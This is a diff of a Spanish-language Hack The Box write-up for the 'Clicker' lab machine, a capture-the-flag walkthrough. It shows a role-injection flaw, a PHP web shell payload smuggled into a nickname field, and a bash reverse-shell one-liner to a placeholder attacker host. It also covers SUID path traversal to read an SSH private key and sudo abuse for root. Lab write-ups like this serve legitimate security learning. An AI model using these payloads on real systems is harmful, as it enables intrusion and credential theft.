@@ -1,4 +1,25 @@
-
+---
+layout: single
+title: Clicker - Hack The Box
+excerpt: ""
+date: 2023-11-04
+classes: wide
+header:
+  teaser: /assets/images/htb-writeup-clicker/clicker_logo.png
+  teaser_home_page: true
+  icon: /assets/images/hackthebox.webp
+categories:
+  - hackthebox
+tags:
+  - exposed source code
+  - burpsuite
+  - mass asignment attack
+  - RFI
+  - LFI
+  - ssh rsa auth
+  - abusing sudoers
+  - abusing SUID
+---
 
 # PortScan
 
@@ -71,14 +92,14 @@ mount -o nolock 10.10.11.232:/ /mnt/
 
 Esto nos montará todo los ficheros/archivos del **NFS** de la máquina víctima en un directorio **"/mnt/"** que estará en la raíz de nuestra máquina local2
 
-![[Pasted image 20231104130546.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104130546.png)
 
 Cuando lo tengamos en local, tendremos un **.ZIP**, el cual debemos descomprimir, pero de primera **NO** nos dejará porqué sólo tiene permiso de lectura, para ello debemos copiárnoslo en otra ruta distinta a la de "**/mnt/**." y ya nos dejaría descomprimirlo.
 ```bash
 cp /mnt/mnt/backups/clicker.htb_backup.zip .
 ```
 
-![[Pasted image 20231104131807.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104131807.png)
 
 Esto nos pondrá el .ZIP en el directorio actual de trabajo, y tan sólo quedaría descomprimirlo.
 
@@ -89,23 +110,23 @@ unzip clicker.htb_backup.zip
 
 Una vez descomprimido, tendríamos lo qué a primera parecería un código fuente de un sitio web.
 
-![[Pasted image 20231104131920.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104131920.png)
 
 En caso de qué encontremos operativo el sitio web con este código fuente, podremos aprovecharnos de lo qué parece una copia de seguridad para buscar vulnerabilidades del mismo.
 
 # Sitio Web
 
-![[Pasted image 20231104125415.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104125415.png)
 
 A primera vista sólo tenemos 3 opciones en el panel, intenté loguearme con usuarios predeterminados para ver sí tenían credenciales default, pero no, en Info no vemos nada interesante, sin embargo, sí analizamos las opciones veremos que coinciden con el código fuente qué encontramos por **NFS**, por lo qué procedemos a registrarnos, para posterior iniciar sesión.
 
 
 Una vez iniciada sesión, veremos un nuevo apartado qué dice "**Play**"
 
-![[Pasted image 20231104125606.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104125606.png)
 
 
-![[Pasted image 20231104125631.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104125631.png)
 
 El cual podemos jugar dando click's y también dependiendo los click's ir subiendo de nivel.
 
@@ -114,73 +135,73 @@ El cual podemos jugar dando click's y también dependiendo los click's ir subien
 
 Sí ahora con **Burpsuite**, interceptamos la petición de "**Save and close**" en la opción donde juegamos dando click, vemos esto:
 
-![[Pasted image 20231104133250.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104133250.png)
 
 Vemos que está usando el recurso "**save_game.php**" para guardar los niveles & click qué tengamos en este momento, y sí analizamos este código fuente.
 
-![[Pasted image 20231104133533.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104133533.png)
 
 Vemos que está haciendo una comparativa a ver sí a nivel de petición colocamos algún campo con nombre "**role**", por lo que nos da una pista de qué cada usuario tiene su **ROL**, por ende habrá algún rol con privilegios, y indagamos más en los códigos fuentes, hasta encontrarnos esto en "export.php"
 
-![[Pasted image 20231104133744.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104133744.png)
 
 Vemos que existe un rol qué es "**Admin**", por lo qué de primera se me ocurre setearlo en la petición con Burp, tal que así:
 
-![[Pasted image 20231104133958.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104133958.png)
 
 Qué como respuesta obtendríamos esto:
 
-![[Pasted image 20231104134102.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104134102.png)
 
 sabiendo como aplica la comparativa el código fuente, y que no está bien sanitizado, podríamos tratar de meter un salto de línea para qué sólo se quede "**role**" y a nivel de código no lea lo demás, tal que así:
 
-![[Pasted image 20231104134417.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104134417.png)
 
-![[Pasted image 20231104134444.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104134444.png)
 
 Como vemos ha funcionado, pero sí recargamos la página de primera no veríamos nada, pero sí salimos de la sesión para volver a entrar veríamos una nueva opción en el panel.
 
-![[Pasted image 20231104134746.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104134746.png)
 
 Al darle a la opción de "**Administration**", vemos que podemos exportar en formato JSON, HTML & TXT, las stats de los mejores jugadores.
 
-![[Pasted image 20231104134912.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104134912.png)
 
 
 Qué al darle a exportar, no las guardará con su respectiva extensión en el directorio "/exports/"
 
-![[Pasted image 20231104135020.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104135020.png)
 
-![[Pasted image 20231104135154.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104135154.png)
 
 Interceptamos la petición cuando exportamos con BurpSuite para ver como viaja.
 
-![[Pasted image 20231104135313.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104135313.png)
 
 Al ver esto, lo primero qué se me ocurre es modificar el txt por .php y ver sí logro exportarlo así.
 
-![[Pasted image 20231104135354.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104135354.png)
 
 Y hemos logrado expórtalo perfectamente con el **.php**
 
 De primera se me ocurre llevar a cabo un **RCE** tratando de cargar una instrucción maliciosa en unos de los campos **click** o **level** a la hora de guardar, pero no me funcionó, indagando más en el código fuente, encontré en **"authenticate.php"** qué existe un campo llamado "nickname"
 
-![[Pasted image 20231104135912.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104135912.png)
 
 Qué de primera a la hora de guardar no nos aparecería, pero forzaremos a que esté con un código malicioso PHP, tal que así:
 
-![[Pasted image 20231104140400.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104140400.png)
 ```
 &nickname=<%3fphp+system($_GET['cmd'])+%3f>
 ```
 
 de forma qué, sí podemos guardar qué el campo "**nickname**" valga esto, a la hora de exportar los top's player en formato **.php**, se interpretará el código malicioso de **nickname**, de forma qué podemos controlar en la **URL** el comando que queramos ejecutar.
 
-![[Pasted image 20231104140557.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104140557.png)
 
 Nos lo ha aceptado, por ende podríamos nuevamente tratar de exportar los topplayer's cambiando la extensión a **.PHP** y ver sí nos lo interpreta.
 
-![[Pasted image 20231104141421.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104141421.png)
 
 No nos está saliendo la exportación clásica, por lo qué nos da a entender que está interpretando el **PHP**, ahora jugamos en la URL con:
 
@@ -190,7 +211,7 @@ No nos está saliendo la exportación clásica, por lo qué nos da a entender qu
 
 Para ejecutar comandos, como vemos:
 
-![[Pasted image 20231104141618.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104141618.png)
 
 Hemos logrado hacer el RCE, por lo qué ahora podemos llevar a cabo un **Reverse Shell** con el one liner clásico, pero antes debemos estar en escucha en nuestra máquina local.
 
@@ -202,11 +223,11 @@ nc -nlvp 443
 bash -c "bash -i >%26 /dev/tcp/ipatacante/PORT 0>%261"
 ```
 
-![[Pasted image 20231104142039.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104142039.png)
 
 Esto nos otorgará una **Reverse Shell** en nuestra máquina local, como vemos:
 
-![[Pasted image 20231104142116.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104142116.png)
 
 Tan sólo deberíamos darle tratamiento a la TTY, y tendríamos una consola en la máquina víctima totalmente funcional, sí no sabes como realizar un tratamiento a la TTY, te recomiendo leer este [((CLICKEAR AQUÍ))](https://4uli.github.io/tratamiento-tty/)
 
@@ -220,7 +241,7 @@ Estamos como el usuario www-data qué es el que corre el servicio WEB, pero nos 
 cat /etc/passwd
 ```
 
-![[Pasted image 20231104142411.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104142411.png)
 
 Vemos qué existe un usuario **Jack**, indagando en el sistema en el directorio "**/opt/**" encontraríamos un binario el cual tenemos permiso para ejecutar, también un README el cual nos dice como ejecutarlo.
 
@@ -228,7 +249,7 @@ Vemos qué existe un usuario **Jack**, indagando en el sistema en el directorio 
 
 Ejecutándolo de la siguiente manera, vemos qué podemos leer archivos:
 
-![[Pasted image 20231104142728.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104142728.png)
 
 Debido a que tiene permisos **SUID** y el propietario es **Jack**, podríamos aprovecharnos de esto para tratar de leer la clave privada.
 
@@ -236,7 +257,7 @@ Debido a que tiene permisos **SUID** y el propietario es **Jack**, podríamos ap
 /execute_query 5 ../.ssh/id_rsa
 ```
 
-![[Pasted image 20231104142943.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104142943.png)
 
 Como vemos hemos obtenido la clave privada, por lo qué procedemos a copiárnosla en local para meterla en un archivo, y conectarnos a través de SSH al usuario Jack.
 
@@ -249,10 +270,10 @@ ssh -i id_rsa jack@10.10.11.232
 
 Nos dará error, esto porque la clave privada no está del todo correcta, y para arreglarla debemos asegurarnos que en "BEGIN OPENSSH" haya cinco guioneos tanto de la izquierda, como de la derecha, es decir, así:
 
-![[Pasted image 20231104153359.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104153359.png)
 
 Y debemos estar igual con 5 en la parte de abajo, una vez hagamos estos pequeños ajustes funcionará y podremos conectarnos, estando como Jack.
-![[Pasted image 20231104153447.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104153447.png)
 
 # Escalada de Privilegios #2
 
@@ -260,7 +281,7 @@ Ahora nos interesaría convertirnos en **Root**, y para ello empezamos una búsq
 
 En este caso, fijandonos en los permisos SUDOERS
 
-![[Pasted image 20231104153633.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104153633.png)
 
 Vemos que podemos ejecutar un script en Bash sin proporcionar ningún tipo de credencial, cuyo script dentro está compuesto por el siguiente código:
 
@@ -288,7 +309,7 @@ fi
 
 Que en el código vemos qué está usando un binario de la ruta "**/usr/bin/xml_pp"**, al examinarlo vemos qué está programado en Perl.
 
-![[Pasted image 20231104154412.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104154412.png)
 
 Por lo qué si indagamos un poco en internet de como poder explotar Perl para escalar nuestro privilegio a ROOT, encontraríamos el siguiente exploit[((Aquí))](https://www.exploit-db.com/exploits/39702) del cual nos aprovecharemos para tomar lo de dentro cmd_exec, y controlar nosotros mismo el comando qué queramos ejecutar, en este caso usaremos este:
 
@@ -304,5 +325,5 @@ Una vez hecho esto, ya podemos obtener una consola como ROOT, tan sólo haciendo
 bash -p
 ```
 
-![[Pasted image 20231104155135.png]]
+![](/assets/images/htb-writeup-clicker/Pasted image 20231104155135.png])
 
